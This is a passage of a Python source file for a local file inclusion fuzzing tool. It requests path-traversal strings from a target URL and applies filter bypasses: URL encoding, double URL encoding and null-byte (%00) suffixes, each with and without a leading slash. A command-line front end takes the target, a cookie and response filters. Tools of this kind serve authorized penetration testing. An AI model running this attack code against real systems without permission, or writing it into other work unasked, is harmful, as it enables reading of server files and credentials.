                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                	print(common.good_code(resp.status_code, f"{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))                	
                resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                	print(common.good_code(resp.status_code, f"{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                resp = requests.get(f"{url}/{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                	print(common.good_code(resp.status_code, f"/{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))                	
                resp = requests.get(f"{url}/{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                	print(common.good_code(resp.status_code, f"/{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                	
                # DOUBLE URLENCODE
                resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                	print(common.good_code(resp.status_code, f"{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
                resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                	print(common.good_code(resp.status_code, f"{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                resp = requests.get(f"{url}/{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                	print(common.good_code(resp.status_code, f"/{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
                resp = requests.get(f"{url}/{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
                	print(common.good_code(resp.status_code, f"/{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            dds += DDS
        ds += DS

        
def main():
    url = None
    path = None
    cookie = None
    hcode = ()
    hsize = ()
    htext = ()
    depth = 5
    try:
        opts, args = getopt.getopt(sys.argv[1:], "u:p:d:c:", ["url=", "path=", "depth=", "hcode=", "hsize=", "htext=", "cookie="])
        for opt, arg in opts:            
            if opt in ("-u", "--url"):                    
                url = arg
            elif opt in ("-p", "--path"):                    
                path = arg
            elif opt in ("--depth"):                    
                depth = int(arg)
            elif opt in ("--hcode"):                    
                hcode = tuple(map(int, arg.split(",")))
            elif opt in ("--hsize"):                    
                hsize = tuple(map(int, arg.split(",")))
            elif opt in ("--htext"):                    
                htext = tuple(map(str, arg.split(",")))
            elif opt in ("-c", "--cookie"):                    
                cookie = common.parse_cookie(arg)
            else:
                help()
                sys.exit(0)
    except getopt.GetoptError as err:
        help()
        sys.exit(0)
    except ValueError as e:
        print(e)
    try:
        if url is not None and path is not None:
            print("\n---------------")
            print("[!] LFI fuzzing")
            print("---------------\n")
            url = common.parse_url(url)
            lfi_fuzz(url, path, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, depth=depth)
            bypass_filter_lfi_fuzz(url, path, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, depth=depth)
        else:
            help()
    except KeyboardInterrupt:
        sys.exit(0)
    except requests.ConnectionError as e:
        print(e)
        sys.exit(0)
    except requests.Timeout as e:
        print(e)
        sys.exit(0)
    except requests.RequestException as e:
        print(e)
        sys.exit(0)

        
if __name__ == "__main__":
    main()
